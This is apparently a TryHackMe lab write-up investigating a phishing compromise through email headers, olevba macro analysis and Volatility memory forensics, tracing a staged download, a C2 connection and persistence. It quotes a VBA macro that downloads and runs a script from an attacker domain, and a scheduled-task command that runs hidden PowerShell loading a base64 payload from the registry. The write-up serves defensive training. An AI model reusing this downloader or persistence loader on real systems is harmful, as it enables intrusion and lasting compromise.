---
title: Boogeyman 2
module: SOC Level 1 Capstone Challenges
path: SOC Level 1
platform: TryHackMe
tags: [phishing-analysis, eml, maldoc, macro-analysis, olevba, vba, memory-forensics, volatility, volatility3, dfir, c2, persistence, scheduled-task, capstone]
status: Completed
date: 2026-08-03
date_completed: 2026-08-03
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/boogeyman2.png width="1500">
</p>

---

## TASK 1 - [Introduction] The Boogeyman is back

- Second capstone in the Boogeyman series. Quick Logistics LLC hardened after the first attack, and the group came back with new TTPs.
- Only two artefacts this time, both in `/home/ubuntu/Desktop/Artefacts`:
  - a copy of the phishing email
  - a memory dump of the victim's workstation
- Big shift from Boogeyman 1. No pcap and no PowerShell logs. Everything after delivery has to come out of RAM.
- Tools on the VM: Volatility 3, olevba (part of oletools), plus grep, strings and md5sum.

### How I approached it

- The email and the attachment are static analysis. What was delivered.
- The memory dump is dynamic analysis. What actually ran.
- I started static and stayed there as long as I could. That turned out to carry me through question 7 before I opened Volatility at all.

### A note on the file name

The memory dump ships as `WKSTN-2961.raw`. I renamed it to `dump.raw` because I did not want to type that every time, so every command below uses the short name.

Doing that in a real case would be wrong, since the file name is part of the record. The correct way to get a short name without touching the evidence is a symlink:

```
ln -s WKSTN-2961.raw dump.raw
```

---

### Volatility 3 cheatsheet

Always `ls` first. The room documentation uses a placeholder name that does not match what is actually on the VM.

```
cd ~/Desktop/Artefacts
ls -lh
```

List every plugin available:

```
vol -f dump.raw -h
```

**Process tree**

```
vol -f dump.raw windows.pstree
```

- Shows parent and child relationships, so it answers "what launched what" directly
- `windows.pslist` gives a flat list instead, fine if you only need a PID
- The leading `*` characters show how deep a process sits in the tree

**Command lines**

```
vol -f dump.raw windows.cmdline
```

- This is where payload paths and opened documents show up

**Network connections**

```
vol -f dump.raw windows.netscan
```

- Local and foreign address, port, state, PID and process name

**Loaded modules**

```
vol -f dump.raw windows.dlllist --pid <pid>
```

- The first row is the executable itself, not a DLL, so this is how you get a full path from a PID

**Readable text across the whole image**

```
strings dump.raw > strings.txt
```

**Two things that saved me time**

- Volatility takes minutes per plugin. Send the output to a text file the first time and grep the file after that, instead of re-running the plugin.
- Filter with `--pid` at the plugin instead of piping to grep. grep strips the column headers, which is what made the output unreadable when I first tried it. `| less -S` also stops the long lines wrapping.

---

### Olevba cheatsheet

```
olevba <attachment>
```

- Dumps the VBA source, then prints a summary table flagging suspicious keywords and pulling out IOCs
- `--decode` tries to decode obfuscated strings
- `--reveal` swaps decoded strings back into the source so the logic reads properly

---

## TASK 2 - [Spear Phishing Human Resources]

### Scenario

- Maxine works in Human Resources at Quick Logistics LLC and received an application for an open position
- The attached resume was malicious and compromised her workstation
- The security team flagged suspicious commands on her workstation, which started the investigation
- Task is to analyse the compromise and assess the impact

---

### 1. What email was used to send the phishing email?

Same starting point as Boogeyman 1. Open the `.eml` and read the headers.

<p align="center">
<img src=screenshots/bm2-sender.png width="700">
</p>

**Answer: westaylor23@outlook.com**

---

### 2. What is the email of the victim employee?

Same header block, recipient side.

<p align="center">
<img src=screenshots/bm2-victim.png width="700">
</p>

**Answer: maxine.beck@quicklogisticsorg.onmicrosoft.com**

---

### 3. What is the name of the attached malicious document?

The attachment name is in the MIME headers.

Worth noting the extension is `.doc` and not `.docx`. The legacy format is what allows the macro to run in the first place.

<p align="center">
<img src=screenshots/bm2-attachment.png width="700">
</p>

**Answer: Resume_WesleyTaylor.doc**

---

### 4. What is the MD5 hash of the malicious attachment?

Extract the attachment, then hash it.

```
md5sum Resume_WesleyTaylor.doc
```

MD5 is broken for security use, but it is still what gets pasted into VirusTotal and shared as an IOC, which is why the room asks for it.

<p align="center">
<img src=screenshots/bm2-md5.png width="700">
</p>

**Answer: 52c4384a0b9e248b95804352ebec6c5b**

---

### 5. What URL is used to download the stage 2 payload based on the document's macro?

```
olevba Resume_WesleyTaylor.doc
```

The macro is short and everything I needed for the next two questions was in it:

```
spath = "C:\ProgramData\"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With

Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
```

Reading it in order:

- `AutoOpen` in the summary table means the whole thing fires the moment the document opens. Maxine did not have to click anything else.
- `Microsoft.XMLHTTP` does the download
- `Adodb.Stream` writes it to disk
- It downloads `update.png` but saves it as `update.js`. The image extension is cosmetic, so it looks like a harmless image request in proxy logs.
- `WScript.Shell` then runs it

<p align="center">
<img src=screenshots/bm2-macro.png width="700">
</p>

**Answer: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png**

---

### 6. What is the name of the process that executed the newly downloaded stage 2 payload?

No memory analysis needed. It is the last line of the macro.

```
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
```

**Something that confused me here.** `update.js` never becomes its own process. It is a script, not an executable, so it has no PID. `wscript.exe` is the process and it interprets the script. That is why you never see an `update.js` row in the process tree.

`wscript.exe` and `cscript.exe` run the same engine. `wscript` is silent, `cscript` prints to a console. Silent is the obvious pick for an attacker.

<p align="center">
<img src=screenshots/bm2-pstree.png width="700">
</p>

**Answer: wscript.exe**

---

### 7. What is the full file path of the malicious stage 2 payload?

Same line of the macro. `spath = "C:\ProgramData\"` plus `.savetofile spath & "\update.js"` gives the full path.

`C:\ProgramData\` gets used a lot because a standard user can write to it and it is not tied to one profile.

<p align="center">
<img src=screenshots/bm2-stage2-path.png width="700">
</p>

**Answer: C:\ProgramData\update.js**

---

### 8. What is the PID of the process that executed the stage 2 payload?

PIDs only exist while something is running, so this is the first question that actually needs the memory dump.

```
vol -f dump.raw windows.pstree > pstree.txt
```

Sending it to a text file means the plugin only runs once. After that searching is instant.

Static analysis already gave me the search term:

```
grep -i "wscript" pstree.txt
```

```
***** 4260	1124	wscript.exe	0xe58f864ca0c0	6	-	3	False	2023-08-21 14:12:47.000000 	N/A
```

First column is the PID, second is the parent PID.

<p align="center">
<img src=screenshots/bm2-pid.png width="700">
</p>

**Answer: 4260**

---

### 9. What is the parent PID of the process that executed the stage 2 payload?

I already had the number from the previous grep, so I looked it up in the same file to find out what it actually was.

```
grep -i "1124" pstree.txt
```

```
****  1124	1440	WINWORD.EXE	0xe58f81150080	18	-	3	False	2023-08-21 14:12:31.000000 	N/A
***** 4336	1124	WINWORD.EXE	0xe58f87547080	0	-	3	False	2023-08-21 14:12:34.000000 	2023-08-21 14:12:45.000000
***** 4260	1124	wscript.exe	0xe58f864ca0c0	6	-	3	False	2023-08-21 14:12:47.000000 	N/A
```

Reading those three rows as a timeline:

- `14:12:31` WINWORD.EXE (1124) starts. Maxine opens the resume.
- `14:12:34` a child WINWORD (4336) spawns and exits at `14:12:45`
- `14:12:47` wscript.exe (4260) spawns from 1124

Sixteen seconds from opening the document to the payload running.

**Do not stop at the number.** A PID on its own proves nothing in a report. Resolving 1124 to WINWORD.EXE is what turns this into evidence, because Word has no legitimate reason to launch a script host. That parent and child pair is the detection.

<p align="center">
<img src=screenshots/bm2-ppid.png width="700">
</p>

**Answer: 1124**

---

### 10. What URL is used to download the malicious binary executed by the stage 2 payload?

This URL is inside `update.js`, which never got written to a command line. It only exists as text sitting in memory, so `strings` across the whole image is the right tool.

```
strings dump.raw > strings.txt
grep -i "boogeymanisback" strings.txt
```

I already had the attacker domain from question 5, which made the grep easy. Same host, same directory, different file name.

Stage 2 was disguised as a `.png`. Stage 3 was not disguised at all.

<p align="center">
<img src=screenshots/bm2-stage3-url.png width="700">
</p>

**Answer: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe**

---

### 11. What is the PID of the malicious process used to establish the C2 connection?

```
vol -f dump.raw windows.netscan > netscan.txt
```

Question 10 gave me the search term.

```
grep -i "update" netscan.txt
```

```
10.10.49.181	63339	128.199.95.189	8080	CLOSED	6216	updater.exe
```

Timeline is what confirmed it was the right process:

- `14:12:47` wscript.exe (4260) runs, stage 2
- `14:12:48` updater.exe starts, one second later
- `14:15:40` the connection out to `128.199.95.189:8080`

**Good thing I grepped the short version.** The file downloaded was `update.exe` but the process running is `updater.exe`, so it was renamed when it was written to disk. Searching the exact file name would have come back empty.

<p align="center">
<img src=screenshots/bm2-netscan.png width="700">
</p>

**Answer: 6216**

---

### 12. What is the full file path of the malicious process used to establish the C2 connection?

netscan gives the process name but not where it lives. `dlllist` filtered to that PID does, because the first row of a process's module list is the executable itself.

```
vol -f dump.raw windows.dlllist --pid 6216 | less -S
```

I tried grepping the PID out of a saved dlllist first and the output was unreadable. Filtering with `--pid` keeps the column headers, which is the actual fix.

<p align="center">
<img src=screenshots/bm2-c2-path.png width="700">
</p>

**Answer: C:\Windows\Tasks\updater.exe**

---

### 13. What is the IP address and port of the C2 connection initiated by the malicious binary?

Already had this from question 11. The same netscan row carries the local address, local port, foreign address, foreign port, state, PID and process name all together, so answering 11 answered this one too.

```
grep -i "update" netscan.txt
```

Port 8080 again, same as Boogeyman 1. It blends in with normal web and proxy traffic.

<p align="center">
<img src=screenshots/bm2-c2-conn.png width="700">
</p>

**Answer: 128.199.95.189:8080**

---

### 14. What is the full file path of the malicious email attachment based on the memory dump?

WINWORD.EXE records the full path of whatever document it was told to open, and that shows up in its command line.

```
vol -f dump.raw windows.cmdline > cmdline.txt
grep -i "resume" cmdline.txt
```

The path is an Outlook cache folder, not Downloads or Documents. `INetCache\Content.Outlook\` is where Outlook drops an attachment when someone opens it straight from the email instead of saving it first.

The `(002)` on the end means Outlook already had a copy cached under that name, so this was not the first time the file was opened.

<p align="center">
<img src=screenshots/bm2-attachment-path.png width="700">
</p>

**Answer: C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc**

---

### 15. The attacker implanted a scheduled task right after establishing the C2 callback. What is the full command used by the attacker to maintain persistent access?

As soon as I read scheduled task my first thought was `schtasks`. The attacker typed the command rather than saving it to a file, so it is sitting in memory as text.

```
strings dump.raw | grep "schtasks"
```

```
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"'
```

Breaking it down:

- `/SC DAILY /ST 09:00` fires every morning at 9am, which is start of business, so the callback blends in with someone logging on and opening things
- `/TN Updater` is a boring name on purpose. Nothing called "Updater" invites a second look in a task list.
- `-NonI -W hidden` means non interactive with no window
- `gp` is `Get-ItemProperty`. It reads a value called `debug` out of `HKCU:\Software\Microsoft\Windows\CurrentVersion`.
- That value is base64, gets decoded, and `IEX` runs it

**The part I did not expect.** The payload is stored in the registry, not on disk. The scheduled task holds no malicious code at all, only a one line loader. That means killing the task alone would not clean the machine, the registry value has to go too.

<p align="center">
<img src=screenshots/bm2-persistence.png width="700">
</p>

**Answer: schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'**

---

## TASK 3 - [Conclusion]

The chain end to end:

- Phishing email to HR posing as a job application, which is a smart target because opening attachments from strangers is literally the job
- Maxine opens `Resume_WesleyTaylor.doc` straight out of Outlook at `14:12:31`
- The macro fires on open, downloads `update.png`, saves it as `C:\ProgramData\update.js` and runs it with `wscript.exe` at `14:12:47`
- The script pulls `update.exe`, writes it as `C:\Windows\Tasks\updater.exe` and runs it at `14:12:48`
- That process calls out to `128.199.95.189:8080`
- A scheduled task called `Updater` is created to run daily at 09:00, loading a base64 payload out of the registry

### Takeaways

**Static analysis first.** One olevba run answered seven of the fifteen questions before I opened Volatility. It also handed me the search terms I needed for the memory dump. Reading what was delivered tells you what to look for in RAM.

**Scripts do not get their own PID.** `.js`, `.vbs`, `.ps1`, `.bat` all run inside a host process. The process tree shows `wscript.exe` or `powershell.exe`, and the malicious part is the argument. That is why `cmdline` matters as much as `pstree`.

**Resolve the parent before you write it down.** WINWORD.EXE spawning wscript.exe is the actual finding. The PID by itself is not.

**Timestamps are what turn correlation into proof.** Three rows of pstree and one row of netscan, read as a timeline, rebuilt the whole intrusion.

**Match the tool to the layer.** I assumed netscan would give me the URL in question 10. It cannot. netscan reads socket structures, so it only ever holds IPs and ports. A URL is a text string and lives in process memory.

**Whole image `strings` is the workhorse.** URLs, typed commands, registry values. Run it once, save it, grep it as much as you want.

**Grep the short version.** `update` found `updater.exe`. `update.exe` would have found nothing.
